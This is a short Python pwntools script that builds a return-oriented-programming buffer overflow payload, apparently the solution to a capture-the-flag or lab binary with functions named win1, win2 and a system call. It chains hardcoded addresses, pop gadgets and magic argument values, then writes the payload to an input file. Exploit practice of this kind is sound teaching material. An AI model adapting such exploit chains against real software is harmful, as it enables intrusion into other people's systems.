#!/usr/bin/python
from pwn import *


padding = b'A' * 28

win1 = p32(0x08048516)
win2 = p32(0x0804855a)
syst = p32(0x080485a7)
main = p32(0x080485e4)

popr = p32(0x08048375)
pop2r = p32(0x08048557)

arg1 = p32(0xabcdef11)
arg2 = p32(0xcafeefca)
arg3 = p32(0xdeadbabe)

exploit = padding + win1 + win2 + popr + arg1 + syst + pop2r + arg2 + arg3

print(exploit)
f = open("input", "wb")
f.write(exploit)
f.close()

